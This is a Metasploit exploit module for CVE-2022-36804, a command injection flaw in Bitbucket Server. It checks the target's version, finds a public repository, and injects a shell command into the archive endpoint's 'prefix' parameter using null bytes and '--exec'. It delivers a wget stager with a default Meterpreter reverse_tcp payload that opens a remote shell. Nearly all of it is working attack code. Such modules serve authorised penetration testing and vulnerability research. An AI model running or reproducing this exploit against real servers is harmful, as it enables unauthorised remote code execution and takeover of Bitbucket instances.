##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Bitbucket Git Command Injection',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'TheGrandPew', # discovery
          'Ron Bowes', # analysis and PoC
          'Jang', # testanull - PoC
          'Shelby Pace' # Metasploit module
        ],
        'References' => [
          [ 'URL', 'https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-advisory-2022-08-24-1155489835.html' ],
          [ 'URL', 'https://attackerkb.com/topics/iJIxJ6JUow/cve-2022-36804/rapid7-analysis' ],
          [ 'CVE', '2022-36804' ]
        ],
        'Platform' => [ 'linux' ],
        'Privileged' => false,
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'Targets' => [
          [
            'Automatic Target',
            {
              'Platform' => 'linux',
              'Arch' => [ ARCH_X86, ARCH_X64 ],
              'CmdStagerFlavor' => 'wget',
              'DefaultOptions' => { 'Payload' => 'linux/x64/meterpreter/reverse_tcp' }
            }
          ]
        ],
        'DisclosureDate' => '2022-08-24',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(7990),
        OptString.new('TARGETURI', [ true, 'The base URI of Bitbucket application', '/'])
      ]
    )
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login')
    )

    return CheckCode::Unknown('Failed to receive response from application') unless res

    unless res.body.include?('Bitbucket')
      return CheckCode::Safe('Target does not appear to be Bitbucket')
    end

    footer = res.get_html_document&.at('footer')
    return CheckCode::Detected('Cannot determine version of Bitbucket') unless footer

    version_str = footer.at('span')&.children&.text
    return CheckCode::Detected('Cannot find version string in footer') unless version_str

    matches = version_str.match(/v(\d+\.\d+\.\d+)/)
    return CheckCode::Detected('Version unknown') unless matches && matches.length > 1

    version_str = matches[1]
    vprint_status("Found Bitbucket version: #{matches[1]}")

    num_vers = Rex::Version.new(version_str)
    return CheckCode::NotVulnerable if num_vers <= Rex::Version.new('6.10.17')

    major, minor, revision = version_str.split('.')
    case major
    when '6'
      return CheckCode::Appears
    when '7'
      case minor
      when '6'
        return CheckCode::Appears if revision.to_i < 17
      when '17'
        return CheckCode::Appears if revision.to_i < 10
      when '21'
        return CheckCode::Appears if revision.to_i < 4
      end
    when '8'
      case minor
      when '0', '1'
        return CheckCode::Appears if revision.to_i < 3
      when '2'
        return CheckCode::Appears if revision.to_i < 2
      when '3'
        return CheckCode::Appears if revision.to_i < 1
      end
    end

    CheckCode::Detected
  end

  def find_public_repo
    print_status('Searching Bitbucket for publicly accessible repository')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'rest/api/latest/repos')
    )

    fail_with(Failure::Disconnected, 'Did not receive a response') unless res
    json_data = JSON.parse(res.body)
    fail_with(Failure::UnexpectedReply, 'Response had no JSON') unless json_data

    unless json_data['size'] > 0
      fail_with(Failure::NotFound, 'Bitbucket instance has no publicly available repositories')
    end

    json_data = json_data['values']&.first
    project = json_data['project']
    fail_with(Failure::NotFound, 'Project not found') unless project
    @project = project['key']
    @repo = json_data['name']

    fail_with(Failure::NotFound, 'Failed to find a repo to use for exploit') unless @project && @repo
    print_good("Found public repo '#{@repo}' in project '#{@project}'!")
  end

  def execute_command(cmd, _opts = {})
    uri = normalize_uri(target_uri.path, 'rest/api/latest/projects', @project, 'repos', @repo, 'archive')
    send_request_cgi(
      'method' => 'GET',
      'uri' => uri,
      'vars_get' =>
      {
        'format' => 'zip',
        'path' => Rex::Text.rand_text_alpha(2..5),
        'prefix' => "#{Rex::Text.rand_text_alpha(1..3)}\x00--exec=`#{cmd}`\x00--remote=#{Rex::Text.rand_text_alpha(3..8)}"
      }
    )
  end

  def exploit
    find_public_repo
    execute_cmdstager
  end
end
